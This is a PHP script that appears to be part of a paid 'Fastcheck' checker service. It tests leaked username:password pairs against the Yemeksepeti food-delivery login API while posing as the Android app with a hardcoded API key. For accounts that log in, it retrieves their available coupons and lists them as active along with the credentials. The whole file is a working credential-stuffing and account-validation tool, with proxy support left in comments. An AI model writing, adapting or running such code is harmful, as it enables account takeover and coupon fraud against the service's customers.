<?php
include_once '../includes/baglan.php';


session_start();
if(isset($_SESSION['uid']) && isset($_SESSION['username'])){
$username=$_SESSION['username'];
$sql = "SELECT * FROM users WHERE username = ?";
$stmt = $con->prepare($sql) or die ($con->error);
$stmt->bind_param('s',$username);
$stmt->execute();
$result_username = $stmt->get_result();
$row = $result_username->fetch_assoc();
if($row['pre']<1){

header("Location:/404.html");

}}else{

  header("Location:/auth/auth-login");
}

$lista = htmlspecialchars($_GET['lista']);
$array = explode(":",$lista);

$kullanici = trim($array[0]);
$sifre = trim($array[1]);

$url = 'https://token.yemeksepeti.com/OpenAuthentication/OAuthService.svc/Login';
$post = '{"apiKey":"E369A71D-2D0F-4D9F-B6C5-932081BD66CB","password":"'.$sifre.'","userName":"'.$kullanici.'"}';
$proxy = '95.170.156.220:808';
//$proxyauth = 'user:sifreword';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLINFO_HEADER_OUT, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'ppVersion: Androidv3.9.1',
    'AppVersionCode: 89',
    'Connection: Keep-Alive',
    'User-Agent: okhttp/4.3.1',
    'Content-Type: application/json'
    ));
// curl_setopt($ch, CURLOPT_PROXY, $proxy);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$curl_scraped_page = curl_exec($ch);
function get_string_between($string, $start, $end) {
    $string = ' '.$string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}
// echo $curl_scraped_page;
$parsed = get_string_between($curl_scraped_page, '"IsSuccess":', ',');
$token = get_string_between($curl_scraped_page, 'OAuth.WebService.DTO","TokenId":"', '","');
if($parsed == 'true'){
    $urll = 'https://api.yemeksepeti.com/YS.WebServices/OrderService.svc/GetAvailableCoupons';
    $post = '{"ysRequest":{"ApiKey":"E369A71D-2D0F-4D9F-B6C5-932081BD66CB","CatalogName":"ADANA","Culture":"tr-TR","PageNumber":0,"PageRowCount":0,"Token":"'.$token.'"}}';
    $curl = curl_init();
    curl_setopt($curl, CURLOPT_URL,$urll);
    curl_setopt($curl, CURLINFO_HEADER_OUT, true);
    curl_setopt($curl, CURLOPT_HTTPHEADER, array(
        'ppVersion: Androidv3.9.1',
        'AppVersionCode: 89',
        'Connection: Keep-Alive',
        'User-Agent: okhttp/4.3.1',
        'Content-Type: application/json'
        ));
    // curl_setopt($ch, CURLOPT_PROXY, $proxy);
    curl_setopt($curl, CURLOPT_POST, 1);
    curl_setopt($curl, CURLOPT_POSTFIELDS, $post);
    //curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxyauth);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    $curl_scraped = curl_exec($curl);
    $totalkupon = get_string_between($curl_scraped, '"TotalPageCount":', ',');
    if($totalkupon == "0")
    {
      echo "✅ <b>#Aktif</b> - $kullanici : $sifre - KUPONSUZ HESAP <b>www.Fastcheck.net</b> <br>";
           }
    else{
    $indirim = get_string_between($curl_scraped, '"CouponDiscountName":', ',');
    $kuponkullanım = get_string_between($curl_scraped, '"Description":', ',');
            echo "✅ <b>#Aktif</b> - $kullanici : $sifre - Toplam Kupon: $totalkupon - İndirim: $indirim - Kupon Kullanım: $kuponkullanım - <b>www.Fastcheck.net</b> <br>";
     }

}
else {
    echo "❌ <b>#Kapalı</b> - $kullanici : $sifre <b>www.Fastcheck.net</b> <br>";
}
curl_close($ch);